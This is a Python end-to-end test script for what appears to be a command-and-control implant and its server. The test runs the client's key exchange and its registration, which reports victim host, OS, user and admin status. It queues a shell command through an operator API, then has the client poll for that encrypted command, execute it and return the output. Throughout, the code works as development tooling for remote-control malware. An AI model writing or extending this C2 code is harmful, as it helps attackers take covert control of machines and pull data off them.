"""Live end-to-end smoke test: drives the REAL client.py handshake/poll/result
code against a REAL running server.py instance over HTTP.

Usage:
  1. Start a server:   PORT=8443 python server.py
  2. Run this script:  python test_live_e2e.py
"""
import json
import os
import urllib.request

# Point the client at the local test server BEFORE importing client.py
os.environ["C2_DOMAIN"] = "http://127.0.0.1:8443"
TOKEN = os.environ.get("OPERATOR_TOKEN", "")
BASE = "http://127.0.0.1:8443"

import socket
import platform
import client  # noqa: E402  (module import only — main loop guarded by __main__)

client.C2_DOMAIN = BASE

# 1. RSA key exchange
assert client.fetch_server_rsa_pub(), "failed to fetch RSA public key"
print("[1] RSA key exchange OK")

# 2. Hybrid registration
cid = f"127.0.0.1:e2e{os.getpid()}"
client.client_id = cid
resp = client.c2_post("/register", {
    "ip": "127.0.0.1", "host": socket.gethostname(),
    "os": f"{platform.system()} {platform.release()}",
    "pid": os.getpid(), "user": "e2e-test", "admin": False,
    "client_id": cid,
})
assert resp.status_code == 200, f"register failed: {resp.status_code}"
print("[2] Hybrid registration OK")

# 3. Unknown client gets the re-register signal (401 -> synthesized action)
fake = client.c2_get("/cmd", params={"id": "9.9.9.9:1"})
assert fake == {"action": "re-register"}, f"unknown-client poll: {fake}"
print("[3] Unknown-client 401 re-register signal OK")

# 4. Queue a command through the operator API
req = urllib.request.Request(
    f"{BASE}/api/send_command",
    data=json.dumps({"client_id": cid, "command": "pwd"}).encode(),
    headers={"Content-Type": "application/json",
             "Authorization": f"Bearer {TOKEN}"},
    method="POST")
with urllib.request.urlopen(req, timeout=10) as r:
    assert r.status == 200, "send_command failed"
print("[4] Command queued via operator API")

# 5. Client polls and receives the encrypted command
cmd_data = client.c2_get("/cmd", params={"id": cid})
assert cmd_data and cmd_data.get("command") == "pwd", f"poll failed: {cmd_data}"
print("[5] Encrypted command received OK")

# 6. Execute it and deliver via the outbox
result = client.execute_command(cmd_data["command"])
client.send_result({"output": result, "command": cmd_data["command"], "client_id": cid})
assert client.flush_outbox(), "outbox flush failed"
print(f"[6] Result delivered via outbox: {result!r}")

# 7. Confirm the server logged the decrypted result
req = urllib.request.Request(f"{BASE}/api/logs",
                             headers={"Authorization": f"Bearer {TOKEN}"})
with urllib.request.urlopen(req, timeout=10) as r:
    logs = json.loads(r.read())
match = [l for l in logs if l["client_id"] == cid and l["output"] == result]
assert match, f"result not found in server logs ({len(logs)} entries)"
print("[7] Server-side decryption + logging verified")

print("\nLIVE END-TO-END TEST PASSED")
